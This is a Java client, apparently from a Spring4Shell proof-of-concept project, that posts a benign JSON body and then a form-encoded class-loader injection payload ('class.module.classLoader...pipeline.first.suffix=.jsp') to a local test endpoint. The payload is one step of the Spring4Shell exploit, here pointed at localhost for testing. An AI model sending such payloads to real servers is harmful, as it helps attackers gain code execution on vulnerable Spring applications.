package com.github.marschall.spring4shell.client;

import java.net.URI;

import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.http.RequestEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

public class Spring4ShellClient {
  
  public static void main(String[] args) {
    RestTemplate restTemplate = new RestTemplate();

    RequestEntity<String> jsonEntity = newJsonEntity();
    ResponseEntity<Void> jsonResponse = restTemplate.exchange(jsonEntity, Void.class);
    System.out.println(jsonResponse.getStatusCodeValue());
    
    RequestEntity<String> payloadEntity = newPayloadEntity();
    ResponseEntity<Void> payloadResponse = restTemplate.exchange(payloadEntity, Void.class);
    System.out.println(payloadResponse.getStatusCodeValue());
  }

  private static RequestEntity<String> newJsonEntity() {
    HttpHeaders httpHeaders = new HttpHeaders();
    httpHeaders.setContentType(MediaType.APPLICATION_JSON);
    return new RequestEntity<>("{name: \"safe\"}", httpHeaders, HttpMethod.POST, URI.create("http://localhost:8080/spring4shell/poc/model"));
  }
  
  private static RequestEntity<String> newPayloadEntity() {
    HttpHeaders httpHeaders = new HttpHeaders();
    httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
    String payload = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp";
    return new RequestEntity<>(payload, httpHeaders, HttpMethod.POST, URI.create("http://localhost:8080/spring4shell/poc/model"));
  }

}
